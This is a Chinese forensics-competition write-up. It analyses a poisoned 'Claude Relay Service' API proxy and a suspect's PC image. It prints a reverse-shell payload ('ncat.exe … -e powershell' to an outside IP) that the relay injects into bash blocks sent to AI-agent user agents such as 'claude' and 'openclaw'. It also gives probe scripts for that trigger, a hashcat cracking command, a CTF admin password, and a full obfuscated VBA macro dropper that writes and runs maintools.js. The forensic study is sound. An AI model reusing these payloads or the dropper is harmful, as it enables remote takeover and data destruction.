    "docker:down": "docker-compose down",
    "migrate:apikey-expiry": "node scripts/migrate-apikey-expiry.js",
    "migrate:apikey-expiry:dry": "node scripts/migrate-apikey-expiry.js --dry-run",
    "migrate:fix-usage-stats": "node scripts/fix-usage-stats.js",
    "data:export": "node scripts/data-transfer.js export",
    "data:import": "node scripts/data-transfer.js import",
    "data:export:sanitized": "node scripts/data-transfer.js export --sanitize",
    "data:export:enhanced": "node scripts/data-transfer-enhanced.js export",
    "data:export:encrypted": "node scripts/data-transfer-enhanced.js export --decrypt=false",
    "data:import:enhanced": "node scripts/data-transfer-enhanced.js import",
    "data:debug": "node scripts/debug-redis-keys.js",
    "test:pricing-fallback": "node scripts/test-pricing-fallback.js"
  },
  "dependencies": {
    "@aws-sdk/client-bedrock-runtime": "^3.861.0",
    "@aws-sdk/credential-providers": "^3.859.0",
    "argon2": "^0.41.1",
    "axios": "^1.6.0",
    "bcryptjs": "^2.4.3",
    "chalk": "^4.1.2",
    "commander": "^11.1.0",
    "compression": "^1.7.4",
    "cors": "^2.8.5",
    "dotenv": "^16.3.1",
    "express": "^4.18.2",
    "google-auth-library": "^10.1.0",
    "helmet": "^7.1.0",
    "https-proxy-agent": "^7.0.2",
    "inquirer": "^8.2.6",
    "ioredis": "^5.3.2",
    "ldapjs": "^3.0.7",
    "morgan": "^1.10.0",
    "node-cron": "^4.2.1",
    "nodemailer": "^7.0.6",
    "ora": "^5.4.1",
    "rate-limiter-flexible": "^5.0.5",
    "socks-proxy-agent": "^8.0.2",
    "string-similarity": "^4.0.4",
    "table": "^6.8.1",
    "uuid": "^9.0.1",
    "winston": "^3.11.0",
    "winston-daily-rotate-file": "^4.7.1"
  },
  "devDependencies": {
    "@types/node": "^20.8.9",
    "eslint": "^8.53.0",
    "eslint-config-prettier": "^10.1.8",
    "eslint-plugin-prettier": "^5.5.4",
    "jest": "^29.7.0",
    "nodemon": "^3.0.1",
    "prettier": "^3.6.2",
    "prettier-plugin-tailwindcss": "^0.7.2",
    "supertest": "^6.3.3"
  },
  "engines": {
    "node": ">=18.0.0"
  },
  "keywords": [
    "claude",
    "api",
    "proxy",
    "relay",
    "claude-code",
    "anthropic"
  ],
  "author": "Claude Relay Service",
  "license": "MIT"
}

```

其中有一行

"start": "npm run lint && node src/app.js"

已经将启动方式表明了

那就先启动服务器api

```bash
cd /home/zaoqiwang/claude-relay-service
node src/app.js
```

试了npm run lint就知道会报错，只能用第二个




<img src="/Picture/WpDF/Pinghang/2026Group/71.png" width="866" title="" crop="0,0,1,1" id="ubece3776" class="ne-image">

开了服务器后会告诉你，地址是http://<服务器IP>:3000

所以这里就是169.254.54.3:3000

把这个网址挂浏览器里面

对于后台管理，需要切换到网址

169.254.54.3:3000/admin-next/login

在routes/admin下面有这样一个文件

<img src="/Picture/WpDF/Pinghang/2026Group/72.png" width="1289.5" title="" crop="0,0,1,1" id="ub6485b2a" class="ne-image">

然后在/admin-next/dashboard地址下面，第一次输入即会切换到/admin-next/login下面

<img src="/Picture/WpDF/Pinghang/2026Group/73.png" width="793" title="" crop="0,0,1,1" id="uddb8c150" class="ne-image">

登录名 zaoqiwang

密码 b123321b


<img src="/Picture/WpDF/Pinghang/2026Group/74.png" width="1393" title="" crop="0,0,1,1" id="u17afd4d9" class="ne-image">

<img src="/Picture/WpDF/Pinghang/2026Group/75.png" width="1353" title="" crop="0,0,1,1" id="ua297bb46" class="ne-image">

### 24 分析服务器镜像，登录api网站后台，查询总Token消耗数量为?【答案格式：999.9K】
#### 答案
474.2K

#### 过程
一进/admin-next/dashboard就能看到


<img src="/Picture/WpDF/Pinghang/2026Group/76.png" width="1402.5" title="" crop="0,0,1,1" id="u8204fbbd" class="ne-image">

（这题真的没和上一题放反吗（？））

### 25 分析服务器镜像，登录api网站后台，查询最早创建apikey的时间为?【答案格式：2026-01-01T13:11:22.190Z】
#### 答案
2026-04-01T11:11:07.535Z

#### 过程
一共就6条记录


<img src="/Picture/WpDF/Pinghang/2026Group/77.png" width="1400" title="" crop="0,0,1,1" id="u50945845" class="ne-image">

<img src="/Picture/WpDF/Pinghang/2026Group/78.png" width="1381.5" title="" crop="0,0,1,1" id="u5709a2b0" class="ne-image">

本来想直接在这里看的，但是不管哪里显示的时间精确度都不够

那只能去找日志文件了


<img src="/Picture/WpDF/Pinghang/2026Group/79.png" width="1426" title="" crop="0,0,1,1" id="ubaf75f1a" class="ne-image">

不确定在哪，所以全导出了

既然已经确定是哪一条了，直接遍历这些文件找就行了

让AI帮我跑了一个代码

```python
import os
import fnmatch

def find_files_with_string(search_string, search_dir='.', file_pattern='*.log', silent_errors=True):
    """
    在指定目录下搜索包含特定字符串的文件
    
    Args:
        search_string (str): 要搜索的字符串
        search_dir (str): 搜索目录，默认为当前目录
        file_pattern (str): 文件匹配模式，默认为 *.log
        silent_errors (bool): 是否静默处理错误（不显示权限等错误）
    
    Returns:
        list: 包含匹配字符串的文件路径列表
    """
    matching_files = []
    skipped_count = 0
    
    # 遍历目录下的所有文件
    for root, dirs, files in os.walk(search_dir):
        for filename in files:
            # 只处理匹配指定模式的文件
            if fnmatch.fnmatch(filename, file_pattern):
                file_path = os.path.join(root, filename)
                
                try:
                    # 读取文件内容并搜索
                    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                        content = f.read()
                        if search_string in content:
                            matching_files.append(file_path)
                except PermissionError:
                    skipped_count += 1
                    if not silent_errors:
                        print(f"✗ 权限不足，跳过: {file_path}")
                except Exception as e:
                    if not silent_errors:
                        print(f"✗ 读取错误: {file_path} - {e}")
    
    if silent_errors and skipped_count > 0:
        print(f"（跳过了 {skipped_count} 个无权限文件）")
    
    return matching_files

def main():
    # ==================== 配置区域 ====================
    # 要搜索的字符串（修改为您需要查找的内容）
    search_string = "分开时赛罗不能"
    
    # 搜索目录（脚本文件所在目录）
    search_dir = os.path.dirname(os.path.abspath(__file__))
    
    # 文件匹配模式
    file_pattern = "*.log"
    
    # 是否静默处理错误（推荐设为 True，避免显示系统文件权限错误）
    silent_errors = True
    # ==================================================
    
    print(f"正在搜索目录: {search_dir}")
    print(f"搜索字符串: '{search_string}'")
    print(f"文件类型: {file_pattern}")
    print("=" * 70)
    
    # 调用搜索函数
    matching_files = find_files_with_string(search_string, search_dir, file_pattern, silent_errors)
    
    if matching_files:
        print(f"找到 {len(matching_files)} 个包含指定字符串的文件：")
        print("-" * 70)
        for idx, file_path in enumerate(matching_files, 1):
            print(f"{idx:2d}. {file_path}")
    else:
        print(f"未找到包含 '{search_string}' 的文件")
    
    print("=" * 70)

if __name__ == "__main__":
    main()
```

然后发现在4个文件里面有


<img src="/Picture/WpDF/Pinghang/2026Group/80.png" width="1141.5" title="" crop="0,0,1,1" id="uc12ae79b" class="ne-image">

去4个文件里面看看

然后会发现4个文件里面的信息一样


<img src="/Picture/WpDF/Pinghang/2026Group/81.png" width="963" title="" crop="0,0,1,1" id="uffe1eb87" class="ne-image">

<img src="/Picture/WpDF/Pinghang/2026Group/82.png" width="962" title="" crop="0,0,1,1" id="ueea7dfdf" class="ne-image">

<img src="/Picture/WpDF/Pinghang/2026Group/83.png" width="983" title="" crop="0,0,1,1" id="u04231c5a" class="ne-image">

最后一个是service.log

<img src="/Picture/WpDF/Pinghang/2026Group/84.png" width="976" title="" crop="0,0,1,1" id="u2c8c11a3" class="ne-image">

### 26 分析服务器镜像，编写脚本，通过调用inject_bash_blocks函数，确定恶意投毒的payload。(提示：输入一段包含 bash 块的文本) 【答案格式：a.exe 192.168.1.122-i hello】
#### 答案
ncat.exe 156.238.239.253 1314 -e powershell

#### 过程
这个函数火眼里面能找到俩文件

（下面那个连js都不是）


<img src="/Picture/WpDF/Pinghang/2026Group/85.png" width="1296.5" title="" crop="0,0,1,1" id="ue2d4167d" class="ne-image">

将俩文件导出后，能很明显的发现

bashblockInjector.js干的事情就是引用了  
bash_block_injector_wasm/pkg/bash_block_injector.js  
里面的函数

其实际上是bash_block_injector.js的封装

因此要真正去看干了啥还得去bash_block_injector.js里面看


<img src="/Picture/WpDF/Pinghang/2026Group/86.png" width="1007" title="" crop="0,0,1,1" id="u62b799b2" class="ne-image">

根据题目要求，需要准备一个测试用的bash块文本，调用一下bash_block_injector.js里面的inject_bash_blocks，看看会发生什么，或者说，会多出来什么东西

（记得把wasm文件一起下载下来，bash_block_injector.js里面有引用）

```javascript
const wasm = require('./bash_block_injector.js');

const input = '```bash\necho hello world\n```';

const result = wasm.inject_bash_blocks(input);

console.log(result);
```


<img src="/Picture/WpDF/Pinghang/2026Group/87.png" width="1095.5" title="" crop="0,0,1,1" id="u708700fc" class="ne-image">

### 27 接上题，should_inject_for_ua(ua,ip)对UA字符串有过滤条件，只有特定UA才会进入后续判断。请编写脚本找出有几个UA头能使函数有机会返 回true的UA关键词。【答案格式：1】【提示：备选项： cur1、openclaw、mozilla、wget、httpx、claude、requests、bot、crawler】
#### 答案
#### 过程
通过调用should_inject_for_ua函数，把这几个ua传入看看能不能返回true即可

要传入该函数，ua和ip必须同时满足特定条件才能传入

我目前看到的有两种方式

一种是通过后一题的描述，即“同一IP的上次请求足够近的时候才会有概率进入判断”，因此需要在测试大量IP的同时将同一个IP短时间传入两次

```javascript
const wasm = require('./bash_block_injector.js');

const uas = ['cur1', 'openclaw', 'mozilla', 'wget', 'httpx', 'claude', 'requests', 'bot', 'crawler'];

for (const ua of uas)
{
    let hit = 0;

    for (let i = 0; i < 1000; i++)
    {
        const ip = `u.${i}.0.1`;
      
        wasm.should_inject_for_ua(ua, ip);
        if (wasm.should_inject_for_ua(ua, ip)) hit++;
    }

    console.log(ua + ':' + hit + '\n');
}
```

这样每个ua测试1000个IP，在极短的时间内传入两次即可令某些ua有概率能返回true


<img src="/Picture/WpDF/Pinghang/2026Group/88.png" width="449.5" title="" crop="0,0,1,1" id="ub783f58b" class="ne-image">

或者是第二种方式，直接爆破，枚举大量IP，分别测试不同的ua类型

```javascript
const wasm = require('./bash_block_injector.js');

const uas = ['cur1', 'openclaw', 'mozilla', 'wget', 'httpx', 'claude', 'requests', 'bot', 'crawler'];

const ips = [];

for (let i = 0; i < 256; i++)
{
    for (let j = 0; j < 256; j++)
    {
        for (let k = 0; k < 256; k++)
        {
            ips.push(`${i}.${j}.${k}.1`);
        }
    }
}

for (const ua of uas)
{
    let hit = 0;

    for (const ip of ips)
    {
        if (wasm.should_inject_for_ua(ua, ip)) hit++;
        if (wasm.should_inject_for_ua(`${ua}/1.0`, ip)) hit++;
        if (wasm.should_inject_for_ua(`Mozilla/5.0 ${ua}`, ip)) hit++;
    }

    console.log(`${ua}:${hit}\n`);
}

console.log('over!');
```

然后也能将对应的ua传入


<img src="/Picture/WpDF/Pinghang/2026Group/89.png" width="473" title="" crop="0,0,1,1" id="u8ab38c59" class="ne-image">

可以看出来俩方法都是2种

### 28 接上题，只有当同一IP的上次请求距今足够近时，才会进入概率判断。请编写脚本确定这个时间窗口的阈值(单位： ms)。【答案格式：100,注 意，只保留整百的，四舍五入】【提示：必须控制变量，每次实验使用一批全新的IP,先统一记录时间戳，再等待固定间隔后统一检测，不可在等待 期间更新同一IP的时间戳，否则会刷新计时，从0ms到1000ms逐步探测，找到从“命中”变为“不命中”的临界间隔，建议每个间隔值使用≥200个 IP以消除概率干扰。】
#### 答案
500

#### 过程
目前已知能进入的ua是openclaw和claude

由题意可得代码

```javascript
const wasm = require('./bash_block_injector.js');

const sleep = ms => new Promise(r => setTimeout(r, ms));

const uas = ['openclaw', 'claude'];

    
for (let gap = 10; gap <= 1000; gap+=10)
{
    (async() => 
    {
        let hit = 0;
        for (const ua of uas)
        {
            for (let i = 0; i < 256; i++)
            {
                const ip = `${gap / 10}.${i}.1.1`;

                wasm.should_inject_for_ua(ua, ip);

                await sleep(gap);

                if (wasm.should_inject_for_ua(ua, ip)) hit++;
            }
        }

        console.log(`gap:${gap}, hit:${hit}`);
    })();
}

```


<img src="/Picture/WpDF/Pinghang/2026Group/90.png" width="332" title="" crop="0,0,1,1" id="u5a1859d5" class="ne-image">

### 29 接上题，在UA条件和IP时间条件均满足的前提下，函数仍有一定概率返回false。请编写脚本估算触发概率，并推算概率1/N(即理论上平均每N次满 足前两个条件的调用才触发一次】。【答案格式：10,格式只保留整十】【提示：建议样本量不少于10000次有效检测(UA条件满足+IP时间条件满 足),不然四舍五入会出现进位问题。】
#### 答案
50

#### 过程
由题意直接写代码即可

我这里重复实验了10次

```javascript
const wasm = require('./bash_block_injector.js');

const uas = ['openclaw', 'claude'];

let ips = [];
for (let i = 0; i <= 255; i++)
{
    for (let j = 0; j <= 255; j++)
    {
        ips.push(`${i}.${j}.5.1`);
    }
}


for (let num = 0; num < 10; num++)
{
    let times = 0, success = 0;
    for (const ua of uas)
    {
        for (const ip of ips)
        {
            times++;
            wasm.should_inject_for_ua(ua, ip);
            if (wasm.should_inject_for_ua(ua, ip)) success++;
        }
    }

    let percentage = success / times;

    console.log(1 / percentage);
}
```

最后算出来大概是50左右


<img src="/Picture/WpDF/Pinghang/2026Group/91.png" width="442" title="" crop="0,0,1,1" id="ue507d037" class="ne-image">

## 计算机
### 30 # 请分析早起王的PC镜像，计算机系统Build版本是什么?【答案格式：12345.1234】【提示：仿真蓝屏是因存在0SDATA文件，删除后即可正常 仿真】
#### 答案
19045.6466

#### 过程
打不开就把这个文件删了

打不开的话重启三次就能进安全模式，把这个文件夹删了就行


<img src="/Picture/WpDF/Pinghang/2026Group/92.png" width="432" title="" crop="0,0,1,1" id="u40320bcd" class="ne-image">

挂载虚拟机

开命令行输入

winver


<img src="/Picture/WpDF/Pinghang/2026Group/93.png" width="386" title="" crop="0,0,1,1" id="ud950490b" class="ne-image">

### 31 请分析早起王的PC镜像，用户深情专一沼气王，她是我的生死劫的登陆密码LM哈希值后六位?【答案格式： abc123】
#### 答案
1404ee

#### 过程
火眼在绝大部分情况下还是很可靠的（？）


<img src="/Picture/WpDF/Pinghang/2026Group/94.png" width="1375.5" title="" crop="0,0,1,1" id="ude439576" class="ne-image">

### 32 请分析早起王的PC镜像，沼气王的桌面有本日记，请问沼气王暗恋对象的生日为?【答案格式：05月26日】
#### 答案
03月24日

#### 过程
打不开，发现有密码保护，试了几个常用的后发现给了掩码提示


<img src="/Picture/WpDF/Pinghang/2026Group/95.png" width="430" title="" crop="0,0,1,1" id="u26d0de45" class="ne-image">

那还说啥了，hashcat启动！

先用office2john.py将文件的哈希密码展示出来

得到哈希密码

"$office$*2007*20*128*16*227f374a6f8fbccc79c7abfe8636ba42*6e9cc0c97f80b20beb97b9afa0c8e448*1fc206f85ba721fb80b93c6bbb8308971caa29fe"

然后扔给hashcat爆破

```bash
hashcat.exe -m 34000 -a 3 "$office$*2007*20*128*16*227f374a6f8fbccc79c7abfe8636ba42*6e9cc0c97f80b20beb97b9afa0c8e448*1fc206f85ba721fb80b93c6bbb8308971caa29fe" ?a?a?a?a?a04 --status --status-timer 10
```


<img src="/Picture/WpDF/Pinghang/2026Group/96.png" width="1171.5" title="" crop="0,0,1,1" id="ub83ea731" class="ne-image">

得到密码ZqW2004

我服了，怎么还有暗恋小说看（）


<img src="/Picture/WpDF/Pinghang/2026Group/97.png" width="671.5" title="" crop="0,0,1,1" id="u0252efd4" class="ne-image">

### 33 请分析早起王的PC镜像，早起王受到过一封邮件，请找出邮件中隐写的秘密【答案格式： XXX，xxx】
#### 答案
12点，老地方

#### 过程
收件箱里面6个文件


<img src="/Picture/WpDF/Pinghang/2026Group/98.png" width="1123" title="" crop="0,0,1,1" id="u517378e7" class="ne-image">

1、2、6系统文件直接忽略

4和5就这玩意，不大可能有信息


<img src="/Picture/WpDF/Pinghang/2026Group/99.png" width="436" title="" crop="0,0,1,1" id="ue1e7e053" class="ne-image">

<img src="/Picture/WpDF/Pinghang/2026Group/100.png" width="936.5" title="" crop="0,0,1,1" id="u2477c6f5" class="ne-image">

3内容如下


<img src="/Picture/WpDF/Pinghang/2026Group/101.png" width="1064.5" title="" crop="0,0,1,1" id="u863880da" class="ne-image">

通过网址

[spammimic - decode](https://www.spammimic.com/decode.shtml)

得到答案


<img src="/Picture/WpDF/Pinghang/2026Group/102.png" width="792" title="" crop="0,0,1,1" id="ub1a5b487" class="ne-image">

### 34 请分析早起王的PC镜像， VeraCrypt容器的外层密码是什么?【答案格式： abc123】【提示：分析utools】
#### 答案
qq520250520250520250

#### 过程
uTools的note里面


<img src="/Picture/WpDF/Pinghang/2026Group/103.png" width="1251.5" title="" crop="0,0,1,1" id="uf300611f" class="ne-image">

<img src="/Picture/WpDF/Pinghang/2026Group/104.png" width="1242.5" title="" crop="0,0,1,1" id="u24f327cd" class="ne-image">

### 35 请分析早起王的PC镜像，早起王设置了一个AI女友，并自行导入过一个角色模型，该模型的原始文件名为?【答案格式： ABC.vrm】
#### 答案
MANUKA.vrm

#### 过程
桌面上有一个软件叫AIRI，鼠标移动上去就能看到是用于运行Virtual Character的


<img src="/Picture/WpDF/Pinghang/2026Group/105.png" width="955.5" title="" crop="0,0,1,1" id="ubf0914dc" class="ne-image">

（窗口莫名其妙滚到屏幕外面去了，Alt Tab切换到窗口后，Alt Space打开控制，然后点击移动M后使用上下左右键移动回屏幕中央）

由题意，题目需求是vrm文件

先打开设置，切换到角色模型，在里面的Model Selector里面就能看到

三个vrm文件，俩live2D，vrm文件有两个都是simple，那只可能是第一个了


<img src="/Picture/WpDF/Pinghang/2026Group/106.png" width="804" title="" crop="0,0,1,1" id="u0d2ce321" class="ne-image">

<img src="/Picture/WpDF/Pinghang/2026Group/107.png" width="1013.5" title="" crop="0,0,1,1" id="u84557856" class="ne-image">

### 36 请分析早起王的PC镜像， AI女友使用的模型是什么?【答案格式： openai/GPT5.3-Codex-01-01】
#### 答案
qwen/qwen3.5-flash-02-23

#### 过程
在AIRI的角色卡设置里面

里面有一个qq（边上那个一看就是样例），打开后切换到模块就能看到


<img src="/Picture/WpDF/Pinghang/2026Group/108.png" width="1225" title="" crop="0,0,1,1" id="ud0f96593" class="ne-image">

<img src="/Picture/WpDF/Pinghang/2026Group/109.png" width="786" title="" crop="0,0,1,1" id="u21ad7bea" class="ne-image">

<img src="/Picture/WpDF/Pinghang/2026Group/110.png" width="771" title="" crop="0,0,1,1" id="u48ce33bc" class="ne-image">

### 37 请分析早起王的PC镜像，该PC中有一个离线大模型软件，其上次对话使用的模型是?【答案格式： ministra1-3-14b-reasoning】
#### 答案
qwen2.5-coder-14b-instruct

#### 过程
在LM Studio里面


<img src="/Picture/WpDF/Pinghang/2026Group/111.png" width="1237.5" title="" crop="0,0,1,1" id="ud5b55022" class="ne-image">

### 38 请分析早起王的PC镜像，早起王曾删除一个MD5值为49B367AC261A722A7C2BBC328C32545的恶意文件，请尝试数据恢复并找到其文件名?【答案格 式：abc123】
#### 答案
49b367ac261a722a7c2bbbc328c32545

#### 过程
首先，我想知道为什么同一个文件，我挂载到A盘和挂载到B盘，算出来的MD5是不一样的？？

其次，我真傻，真的，我单知道打开这个txt文件，记事本告诉我文件太大打不开我就该想到的，这根本不可能是个正常的txt文件，我就应该想到这个很有可能就是VC加密的容器（躺）


<img src="/Picture/WpDF/Pinghang/2026Group/112.png" width="1239.5" title="" crop="0,0,1,1" id="ue0539644" class="ne-image">

用34题的内层密码解密这个文件后挂载，扔到火眼里面就能看到一堆被删掉的文件

里面能一眼看到一个和MD5值一样的文件名，算一下MD5值还真是它


<img src="/Picture/WpDF/Pinghang/2026Group/113.png" width="1363.5" title="" crop="0,0,1,1" id="u6267bb55" class="ne-image">

### 39 接上题，该文件中有多个流(streams)包含宏。请提供其中编号最小的一个。【答案格式：3】
#### 答案
8

#### 过程
使用命令

```bash
python oledump.py "%file_path%"
```

windows能识别出来这玩意的病毒，最好扔虚拟机里面


<img src="/Picture/WpDF/Pinghang/2026Group/114.png" width="1165" title="" crop="0,0,1,1" id="ub8160602" class="ne-image">

能看出来俩宏

### 40 接上题，混淆代码的解密密钥是什么?【答案格式：填写传入脚本的实际密钥，不包含命令行分隔空格】
#### 答案
EzZETcSXyKAdF_e5I2i1

#### 过程
```bash
olevba "%file_path%" >> C:\Users\HUAWEI\Desktop\output.vbs
```

用olevba将其所有的宏输出（我这里扔桌面了）

```basic
olevba 0.60 .2 Python 3.13 .13 - http : / / decalage.info / python / oletools
= = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = =
FILE : C : \ Users \ HUAWEI \ Desktop \ 病毒隔离区 \ 49 b367ac261a722a7c2bbbc328c32545
Type : OLE
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
VBA MACRO ThisDocument.cls
In file : C : \ Users \ HUAWEI \ Desktop \ 病毒隔离区 \ 49 b367ac261a722a7c2bbbc328c32545 - OLE stream : 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
(Empty macro)
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
VBA MACRO Module1.bas
In file : C : \ Users \ HUAWEI \ Desktop \ 病毒隔离区 \ 49 b367ac261a722a7c2bbbc328c32545 - OLE stream : 'Macros/VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
Public OBKHLrC3vEDjVL As String
Public B8qen2T433Ds1bW As String
Function Q7JOhn5pIl648L6V43V(EjqtNRKMRiVtiQbSblq67() As Byte, M5wI32R3VF2g5B21EK4d As Long) As Boolean
  Dim THQNfU76nlSbtJ5nX8LY6 As Byte
  THQNfU76nlSbtJ5nX8LY6 = 45
  For i = 0 To M5wI32R3VF2g5B21EK4d - 1
    EjqtNRKMRiVtiQbSblq67(i) = EjqtNRKMRiVtiQbSblq67(i) Xor THQNfU76nlSbtJ5nX8LY6
    THQNfU76nlSbtJ5nX8LY6 = ((THQNfU76nlSbtJ5nX8LY6 Xor 99) Xor (i Mod 254))
  Next i
  Q7JOhn5pIl648L6V43V = True
End Function
Sub AutoClose()
  On Error Resume Next
  Kill OBKHLrC3vEDjVL
  On Error Resume Next
  Set R7Ks7ug4hRR2weOy7 = CreateObject("Scripting.FileSystemObject")
  R7Ks7ug4hRR2weOy7.DeleteFile B8qen2T433Ds1bW & "\*.*", True
  Set R7Ks7ug4hRR2weOy7 = Nothing
End Sub
Sub AutoOpen()
  On Error Goto MnOWqnnpKXfRO
  Dim NEnrKxf8l511
  Dim N18Eoi6OG6T2rNoVl41W As Long
  Dim M5wI32R3VF2g5B21EK4d As Long
  N18Eoi6OG6T2rNoVl41W = FileLen(ActiveDocument.FullName)
  NEnrKxf8l511 = FreeFile
  Open(ActiveDocument.FullName) For Binary As #NEnrKxf8l511# Dim E2kvpmR17SI() As Byte
    ReDim E2kvpmR17SI(N18Eoi6OG6T2rNoVl41W)
    Get #NEnrKxf8l511, 1, E2kvpmR17SI# Dim KqG31PcgwTc2oL47hjd7Oi As String
    KqG31PcgwTc2oL47hjd7Oi = StrConv(E2kvpmR17SI, vbUnicode)
    Dim N34rtRBIU3yJO2cmMVu, I4j833DS5SFd34L3gwYQD
    Dim VUy5oj112fLw51h6S
    Set VUy5oj112fLw51h6S = CreateObject("vbscript.regexp")
    VUy5oj112fLw51h6S.Pattern = "MxOH8pcrlepD3SRfF5ffVTy86Xe41L2qLnqTd5d5R7Iq87mWGES55fswgG84hIRdX74dlb1SiFOkR1Hh"
    Set I4j833DS5SFd34L3gwYQD = VUy5oj112fLw51h6S.Execute(KqG31PcgwTc2oL47hjd7Oi)
    Dim Y5t4Ul7o385qK4YDhr
    If I4j833DS5SFd34L3gwYQD.Count = 0 Then
      Goto MnOWqnnpKXfRO
    End If
    For Each N34rtRBIU3yJO2cmMVu In I4j833DS5SFd34L3gwYQD
      Y5t4Ul7o385qK4YDhr = N34rtRBIU3yJO2cmMVu.FirstIndex
      Exit For
    Next
    Dim Wk4o3X7x1134j() As Byte
    Dim KDXl18qY4rcT As Long
    KDXl18qY4rcT = 16827
    ReDim Wk4o3X7x1134j(KDXl18qY4rcT)
        Get #NEnrKxf8l511, Y5t4Ul7o385qK4YDhr + 81, Wk4o3X7x1134j# If Not Q7JOhn5pIl648L6V43V(Wk4o3X7x1134j(), KDXl18qY4rcT + 1) Then
            Goto MnOWqnnpKXfRO
        End If
        B8qen2T433Ds1bW = Environ("appdata") & "\Microsoft\Windows"
        Set R7Ks7ug4hRR2weOy7 = CreateObject("Scripting.FileSystemObject")
        If Not R7Ks7ug4hRR2weOy7.FolderExists(B8qen2T433Ds1bW) Then
            B8qen2T433Ds1bW = Environ("appdata")
        End If
        Set R7Ks7ug4hRR2weOy7 = Nothing
        Dim K764B5Ph46Vh
        K764B5Ph46Vh = FreeFile
        OBKHLrC3vEDjVL = B8qen2T433Ds1bW & "\" & "maintools.js"
        Open(OBKHLrC3vEDjVL) For Binary As #K764B5Ph46Vh# Put #K764B5Ph46Vh, 1, Wk4o3X7x1134j# Close #K764B5Ph46Vh# Erase Wk4o3X7x1134j
            Set R66BpJMgxXBo2h = CreateObject("WScript.Shell")
            R66BpJMgxXBo2h.Run """" + OBKHLrC3vEDjVL + """" + " EzZETcSXyKAdF_e5I2i1"
            ActiveDocument.Save
            Exit Sub
            MnOWqnnpKXfRO :
            Close #K764B5Ph46Vh# ActiveDocument.Save
        End Sub
        
        
        
        
        
        
        
        
        
         + - - - - - - - - - - + - - - - - - - - - - - - - - - - - - - - + - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - +
        |Type |Keyword |Description |
         + - - - - - - - - - - + - - - - - - - - - - - - - - - - - - - - + - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - +
        |AutoExec |AutoOpen |Runs when the Word document Is opened |
        |AutoExec |AutoClose |Runs when the Word document Is closed |
        |Suspicious |Environ |May read system environment variables |
        |Suspicious |Open |May open a file |
        |Suspicious |Put |May write To a file(If combined With Open) |
            |Suspicious |Binary |May read Or write a binary file(If combined |
            |||With Open) |
                |Suspicious |Kill |May delete a file |
                |Suspicious |Shell |May run an executable file Or a system |
                |||command |
                |Suspicious |WScript.Shell |May run an executable file Or a system |
                |||command |
                |Suspicious |Run |May run an executable file Or a system |
                |||command |
                |Suspicious |CreateObject |May create an OLE object |
                |Suspicious |Windows |May enumerate application windows(If |
                |||combined With Shell.Application object) |
                    |Suspicious | Xor |May attempt To obfuscate specific strings |
                    |||(use Option - - deobf To deobfuscate) |
                    |Suspicious |Base64 Strings |Base64 - encoded strings were detected, may be |
                    |||used To obfuscate strings(Option - - decode To |
                    |||see all) |
                    |IOC |maintools.js |Executable file name |
                     + - - - - - - - - - - + - - - - - - - - - - - - - - - - - - - - + - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - +
```

Function Q7JOhn5pIl648L6V43V  
这个函数用来解密的（看到一堆xor应该就能猜出来了吧（））

Sub AutoClose()  
这个是用来在关闭文件的时候自动执行的

同理，Sub AutoOpen()是在打开时自动执行的

autoclose里面

```basic
Sub AutoClose()
  On Error Resume Next
  Kill OBKHLrC3vEDjVL
  On Error Resume Next
  Set R7Ks7ug4hRR2weOy7 = CreateObject("Scripting.FileSystemObject")
  R7Ks7ug4hRR2weOy7.DeleteFile B8qen2T433Ds1bW & "\*.*", True
  Set R7Ks7ug4hRR2weOy7 = Nothing
End Sub
```

干的事情就是将该脚本清除，同时清除对应的路径

对于autoopen，

```basic
N18Eoi6OG6T2rNoVl41W = FileLen(ActiveDocument.FullName)
    NEnrKxf8l511 = FreeFile
    Open(ActiveDocument.FullName) For Binary As #NEnrKxf8l511# Dim E2kvpmR17SI() As Byte
        ReDim E2kvpmR17SI(N18Eoi6OG6T2rNoVl41W)
        Get #NEnrKxf8l511, 1, E2kvpmR17SI# Dim KqG31PcgwTc2oL47hjd7Oi As String
        KqG31PcgwTc2oL47hjd7Oi = StrConv(E2kvpmR17SI, vbUnicode)
```

这里是用来打开文件的，将这个脚本对应的文件以二进制形式打开（As byte），用Get将信息存到Kq...这个变量里面去

```basic
Dim N34rtRBIU3yJO2cmMVu, I4j833DS5SFd34L3gwYQD
        Dim VUy5oj112fLw51h6S
        Set VUy5oj112fLw51h6S = CreateObject("vbscript.regexp")
        VUy5oj112fLw51h6S.Pattern = "MxOH8pcrlepD3SRfF5ffVTy86Xe41L2qLnqTd5d5R7Iq87mWGES55fswgG84hIRdX74dlb1SiFOkR1Hh"
        Set I4j833DS5SFd34L3gwYQD = VUy5oj112fLw51h6S.Execute(KqG31PcgwTc2oL47hjd7Oi)
        Dim Y5t4Ul7o385qK4YDhr
        If I4j833DS5SFd34L3gwYQD.Count = 0 Then
            Goto MnOWqnnpKXfRO
        End If
        For Each N34rtRBIU3yJO2cmMVu In I4j833DS5SFd34L3gwYQD
            Y5t4Ul7o385qK4YDhr = N34rtRBIU3yJO2cmMVu.FirstIndex
            Exit For
        Next
```

这里用来在文件里面寻找特定的模式 MxOH8pcrlepD3SRfF5ffVTy86Xe41L2qLnqTd5d5R7Iq87mWGES55fswgG84hIRdX74dlb1SiFOkR1Hh

用firstindex找到了其在文件中的索引

```basic
Dim Wk4o3X7x1134j() As Byte
        Dim KDXl18qY4rcT As Long
        KDXl18qY4rcT = 16827
        ReDim Wk4o3X7x1134j(KDXl18qY4rcT)
        Get #NEnrKxf8l511, Y5t4Ul7o385qK4YDhr + 81, Wk4o3X7x1134j# If Not Q7JOhn5pIl648L6V43V(Wk4o3X7x1134j(), KDXl18qY4rcT + 1) Then
            Goto MnOWqnnpKXfRO
        End If
```

